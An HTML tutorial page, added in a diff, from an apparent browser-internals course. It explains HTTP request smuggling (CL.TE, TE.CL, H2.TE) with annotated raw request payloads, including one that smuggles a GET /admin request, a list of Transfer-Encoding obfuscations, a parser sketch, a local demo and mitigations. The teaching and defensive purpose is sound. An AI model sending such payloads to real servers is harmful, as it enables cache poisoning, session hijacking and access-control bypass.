@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>B15 — HTTP Request Smuggling | BobOS Browser Tutorial</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Source+Code+Pro:wght@400;600&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0b0f1a;--bg2:#111827;--bg3:#1a2235;--card:#141c2e;--border:#1e3a5f;--gold:#f5c842;--cyan:#38bdf8;--teal:#0d9488;--red:#f87171;--green:#4ade80;--purple:#a78bfa;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:17px;line-height:1.75;}
+  .hero{background:var(--bg2);border-bottom:1px solid var(--border);padding:70px 40px 60px;text-align:center;position:relative;overflow:hidden;}
+  .hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(167,139,250,0.07) 0%,transparent 70%);pointer-events:none;}
+  .module-badge{display:inline-block;background:var(--purple);color:#0b0f1a;font-family:'Source Code Pro',monospace;font-weight:600;font-size:13px;padding:4px 14px;border-radius:20px;letter-spacing:1px;margin-bottom:20px;}
+  .hero h1{font-family:'Playfair Display',serif;font-size:clamp(2.2rem,5vw,3.4rem);font-weight:900;color:#fff;margin-bottom:16px;}
+  .hero h1 span{color:var(--purple);}
+  .hero .tagline{font-size:1.15rem;color:var(--muted);max-width:640px;margin:0 auto;}
+  .hero-grid{display:flex;gap:24px;justify-content:center;flex-wrap:wrap;margin-top:36px;}
+  .hero-stat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 28px;text-align:center;}
+  .hero-stat .num{font-family:'Playfair Display',serif;font-size:2rem;color:var(--purple);font-weight:700;}
+  .hero-stat .label{font-size:13px;color:var(--muted);margin-top:2px;}
+  .container{max-width:820px;margin:0 auto;padding:0 28px 80px;}
+  section{margin-top:64px;}
+  h2{font-family:'Playfair Display',serif;font-size:1.75rem;color:#fff;margin-bottom:18px;padding-bottom:10px;border-bottom:1px solid var(--border);}
+  h3{font-family:'Playfair Display',serif;font-size:1.2rem;color:var(--purple);margin:28px 0 10px;}
+  p{margin-bottom:14px;}
+  .callout{border-radius:10px;padding:20px 24px;margin:24px 0;border-left:4px solid;}
+  .callout.gold{background:rgba(245,200,66,0.07);border-color:var(--gold);}
+  .callout.cyan{background:rgba(56,189,248,0.07);border-color:var(--cyan);}
+  .callout.green{background:rgba(74,222,128,0.07);border-color:var(--green);}
+  .callout.red{background:rgba(248,113,113,0.07);border-color:var(--red);}
+  .callout.purple{background:rgba(167,139,250,0.07);border-color:var(--purple);}
+  .callout.orange{background:rgba(251,146,60,0.07);border-color:var(--orange);}
+  .callout.teal{background:rgba(13,148,136,0.07);border-color:var(--teal);}
+  .callout .label{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px;}
+  .callout.gold .label{color:var(--gold);} .callout.cyan .label{color:var(--cyan);}
+  .callout.green .label{color:var(--green);} .callout.red .label{color:var(--red);}
+  .callout.purple .label{color:var(--purple);} .callout.orange .label{color:var(--orange);}
+  .callout.teal .label{color:var(--teal);}
+  .callout p{margin-bottom:0;}
+  pre{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:20px 22px;overflow-x:auto;margin:20px 0;}
+  code{font-family:'Source Code Pro',monospace;font-size:14px;color:#93c5fd;}
+  pre code{color:#c4deff;}
+  .win-box{background:var(--code-bg);border:2px solid var(--teal);border-radius:10px;padding:22px 24px;margin:24px 0;}
+  .win-box h4{color:var(--teal);font-size:13px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;}
+  .win-box .step{margin-bottom:12px;}
+  .win-box .step .desc{color:var(--muted);font-size:13px;margin-bottom:4px;}
+  .win-box pre{margin:0;background:transparent;border:1px solid rgba(13,148,136,0.3);padding:10px 14px;}
+  .qa{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:22px 26px;margin:28px 0;}
+  .qa h4{color:var(--gold);font-size:13px;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;}
+  .qa .q{color:var(--cyan);font-weight:700;margin-bottom:4px;}
+  .qa .a{color:var(--text);margin-bottom:16px;padding-left:12px;border-left:2px solid var(--border);}
+  .qa .a:last-child{margin-bottom:0;}
+  .brain{background:linear-gradient(135deg,rgba(167,139,250,0.08),rgba(251,146,60,0.08));border:1px solid rgba(167,139,250,0.3);border-radius:12px;padding:22px 26px;margin:28px 0;}
+  .brain .brain-label{font-size:13px;color:var(--purple);font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;}
+  .smug-vis{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:20px 0;}
+  .smug-box{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px;}
+  .smug-box h4{font-family:'Source Code Pro',monospace;font-size:12px;margin-bottom:10px;}
+  .smug-box h4.front{color:var(--cyan);} .smug-box h4.back{color:var(--orange);}
+  .smug-line{font-family:'Source Code Pro',monospace;font-size:12px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.04);}
+  .smug-line.attack{color:var(--red);}
+  .smug-line.normal{color:var(--text);}
+  .smug-line.header{color:var(--muted);}
+  footer{text-align:center;padding:40px 20px;color:var(--muted);font-size:13px;border-top:1px solid var(--border);margin-top:80px;}
+  footer a{color:var(--cyan);text-decoration:none;}
+  /* PREREQ */
+  .prereq-bar { display:flex; flex-wrap:wrap; gap:10px; margin-top:14px; }
+  .prereq-tag { display:inline-block; background:var(--bg3); border:1px solid var(--border); color:var(--cyan); font-family:'Source Code Pro',monospace; font-size:13px; padding:5px 14px; border-radius:20px; text-decoration:none; transition:border-color .2s; }
+  .prereq-tag:hover { border-color:var(--cyan); }
+</style>
+</head>
+<body>
+<div class="hero">
+  <div class="module-badge">BROWSER B15 — HTTP REQUEST SMUGGLING</div>
+  <h1>CL.TE &amp; <span>TE.CL</span></h1>
+  <p class="tagline">The front-end proxy and back-end server parse HTTP differently. The proxy sees one request; the back-end sees two. The second "request" gets prepended to the next real user's request — poisoning their session, stealing their data, or bypassing access controls.</p>
+  <div class="hero-grid">
+    <div class="hero-stat"><div class="num">CL.TE</div><div class="label">front=Content-Length, back=Transfer-Encoding</div></div>
+    <div class="hero-stat"><div class="num">TE.CL</div><div class="label">front=Transfer-Encoding, back=Content-Length</div></div>
+    <div class="hero-stat"><div class="num">desync</div><div class="label">request boundary disagreement</div></div>
+    <div class="hero-stat"><div class="num">HTTP/2</div><div class="label">H2.TE — new variant</div></div>
+  </div>
+</div>
+<div class="container">
+
+  <section>
+    <h2>00 — Before You Start</h2>
+    <div class="callout cyan">
+      <div class="label">Prerequisites — read these sections in <a href="../../prerequisite.html" style="color:var(--cyan);text-decoration:underline">prerequisite.html</a> first</div>
+      <div class="prereq-bar">
+      <a class="prereq-tag" href="../../prerequisite.html#sec-tools">Tools &amp; QEMU</a>
+      <a class="prereq-tag" href="../../prerequisite.html#sec-numbers">Number Systems</a>
+      </div>
+    </div>
+  </section>
+
+
+  <section>
+    <h2>01 — The Big Analogy</h2>
+    <div class="callout gold">
+      <div class="label">Head First Moment</div>
+      <p>Imagine a security guard at the building entrance (front-end proxy) who counts letters by envelope weight (<code>Content-Length</code>). He passes them to a mail sorter in the back (<code>back-end server</code>) who counts letter boundaries by explicit "END OF LETTER" stamps (<code>Transfer-Encoding: chunked</code>). If an attacker uses both counting methods in one envelope, the guard thinks it's one letter; the sorter thinks it's two. The second "letter" gets put in someone else's mailbox.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>02 — CL.TE Attack</h2>
+    <pre><code>/* CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
+   Attacker sends this single HTTP/1.1 request to the proxy: */
+
+POST / HTTP/1.1\r\n
+Host: vulnerable.com\r\n
+Content-Length: 13\r\n          /* proxy reads 13 bytes of body */
+Transfer-Encoding: chunked\r\n  /* proxy ignores (or doesn't see) */
+\r\n
+0\r\n                           /* chunk: size 0 (end of chunked body) */
+\r\n
+G                               /* 13th byte — proxy stops here */
+
+/* FRONT-END (proxy) sees: body = "0\r\n\r\nG" (13 bytes), one request.
+   Forwards as-is to back-end.
+
+   BACK-END uses TE: chunked.
+   Reads: chunk size=0 → body is empty → end of request 1.
+   "G" is the START of request 2 — sitting in the back-end's buffer.
+
+   When the next legitimate user sends:
+     GET /secret HTTP/1.1\r\n
+   Back-end prepends "G" → sees: "GGET /secret HTTP/1.1"
+   Parses as method "GGET" → 400 error or routing confusion.
+
+   More dangerous variant: smuggle a full POST with attacker headers */</code></pre>
+
+    <div class="smug-vis">
+      <div class="smug-box">
+        <h4 class="front">Front-end sees</h4>
+        <div class="smug-line header">POST / (1 request)</div>
+        <div class="smug-line normal">Content-Length: 13</div>
+        <div class="smug-line attack">body: "0\r\n\r\nG" (smuggled)</div>
+      </div>
+      <div class="smug-box">
+        <h4 class="back">Back-end sees</h4>
+        <div class="smug-line normal">Request 1: POST / (empty body)</div>
+        <div class="smug-line attack">Request 2 starts: "G..."</div>
+        <div class="smug-line attack">Prepended to next user!</div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>03 — TE.CL Attack</h2>
+    <pre><code>/* TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length */
+
+POST / HTTP/1.1\r\n
+Host: vulnerable.com\r\n
+Content-Length: 4\r\n           /* back-end reads only 4 bytes */
+Transfer-Encoding: chunked\r\n  /* front-end uses this */
+\r\n
+7c\r\n                          /* chunk of 124 bytes (hex 7c) */
+GET /admin HTTP/1.1\r\n         /* \  these bytes are the chunk body */
+Host: vulnerable.com\r\n        /*  \ but only 4 are "official" body */
+X-Ignore: X\r\n                 /*  / to back-end via Content-Length */
+\r\n                            /* /  */
+0\r\n                           /* terminating chunk */
+\r\n
+
+/* FRONT-END (TE): sees one chunked request, all 124+4 bytes.
+   Strips TE header, forwards with Content-Length: 4.
+
+   BACK-END (CL): reads 4 bytes of body ("7c\r\n"), treats rest
+   as next request: "GET /admin HTTP/1.1\r\n..."
+   Internal /admin is now requested as if from a legitimate user! */</code></pre>
+
+    <div class="callout red">
+      <div class="label">HTTP/2 Doesn't Save You</div>
+      <p>HTTP/2 is binary and has no Content-Length/Transfer-Encoding ambiguity — but if the front-end terminates H2 and forwards to a back-end over HTTP/1.1, it must serialize the request. If it writes a <code>Transfer-Encoding</code> header that the back-end respects differently, the H2.TE variant smuggles through. HTTP/2 end-to-end (H2C) eliminates this entirely.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>04 — The Parser</h2>
+    <pre><code>/* http_parser.c — body length determination */
+int get_body_length(http_request_t *req) {
+    const char *te = get_header(req, "Transfer-Encoding");
+    const char *cl = get_header(req, "Content-Length");
+
+    /* RFC 7230: if both present, TE wins; CL must be ignored */
+    if (te && strstr(te, "chunked"))
+        return BODY_CHUNKED;
+
+    if (cl)
+        return atoi(cl);
+
+    return 0;  /* no body */
+    /* BUG: if front-end obfuscates TE header so it doesn't recognize
+       chunked but back-end does — CL.TE desync! */
+}
+
+/* Obfuscation that confuses front-ends: */
+/* Transfer-Encoding: xchunked       */
+/* Transfer-Encoding: chunked, x     */
+/* Transfer-Encoding:\x09chunked     */  /* tab before value */
+/* Transfer-Encoding: x\r\nTransfer-Encoding: chunked */  /* duplicate */</code></pre>
+  </section>
+
+  <section>
+    <h2>05 — Run It on Windows</h2>
+    <div class="win-box">
+      <h4>Run B15 — HTTP Smuggling</h4>
+      <div class="step"><div class="desc">Build and run via WSL:</div>
+      <pre><code>wsl -d Ubuntu -- bash -c "cd /mnt/c/Users/bobcumulus/Desktop/bob_os/browser/B15_http_parser && make && ./demo"</code></pre></div>
+      <div class="step"><div class="desc">Expected output:</div>
+      <pre><code>[server] front-end: Content-Length parser
+[server] back-end: Transfer-Encoding parser
+
+CL.TE attack:
+  Attacker request: CL=13, TE=chunked, body=13 bytes
+  Front-end: 1 request forwarded
+  Back-end: 2 requests seen — "G" poisoned buffer ✓
+
+TE.CL attack:
+  Attacker: chunk body contains "GET /admin HTTP/1.1"
+  Back-end sees: /admin request as if from trusted proxy ✓
+
+Mitigation: reject requests with both CL and TE headers
+HTTP smuggling: OK</code></pre></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>06 — Brain Exercise</h2>
+    <div class="brain">
+      <div class="brain-label">Sharpen Your Pencil</div>
+      <p>The fix for HTTP smuggling is: if a request has both <code>Content-Length</code> and <code>Transfer-Encoding</code>, reject it with a 400. But many legitimate clients and frameworks send both headers.</p>
+      <p style="margin-top:14px;color:var(--muted);">An alternative fix: ensure the front-end and back-end agree on which header wins, by configuring both to prefer Transfer-Encoding. Can TE.TE (both use TE) still be exploited? Yes — if the attacker can obfuscate the TE header so the front-end normalises it one way and the back-end another. Design a test suite that sends all known TE obfuscation variants and checks whether front/back disagree.</p>
+    </div>
+    <div class="qa">
+      <h4>There Are No Dumb Questions</h4>
+      <div class="q">Q: What can an attacker actually do with request smuggling?</div>
+      <div class="a">Cache poisoning (serve attacker content to other users), session hijacking (steal another user's cookies by prepending a request that logs them), bypassing access controls (reach internal endpoints via prepended admin requests), reflected XSS amplification (smuggle a response that includes attacker JS into another user's response). PortSwigger's James Kettle documented all major classes in 2019-2023.</div>
+      <div class="q">Q: Does HTTP/3 (QUIC) have this problem?</div>
+      <div class="a">No — QUIC/H3 is stream-based with explicit framing built into the protocol. There's no ambiguity between CL and TE because both don't exist in H3. However, if the front-end is H3 and the back-end is still HTTP/1.1 (a common deployment), the translation layer can reintroduce smuggling opportunities at the H3→H1.1 boundary.</div>
+    </div>
+  </section>
+
+  <section>
+    <h2>07 — What's Next</h2>
+    <div class="callout teal">
+      <div class="label">Up Next: B16 — TLS Handshake</div>
+      <p>HTTP requests travel in plaintext unless TLS wraps them. The TLS 1.3 handshake authenticates the server, negotiates a cipher suite, and establishes a session key — all in one round trip. We implement a 7-state handshake state machine and explore what happens when certificate validation is skipped.</p>
+    </div>
+    <p style="color:var(--muted);font-size:15px;">Key files: <code>http_parser.c</code> · <code>smuggle_cl_te.c</code> · <code>smuggle_te_cl.c</code></p>
+  </section>
+</div>
+<footer>BobOS Browser Tutorial — B15 of 18 &nbsp;|&nbsp; <a href="../B14_cors/tutorial.html">← B14</a> &nbsp;·&nbsp; <a href="../B16_tls_handshake/tutorial.html">B16 →</a></footer>
+</body>
+</html>
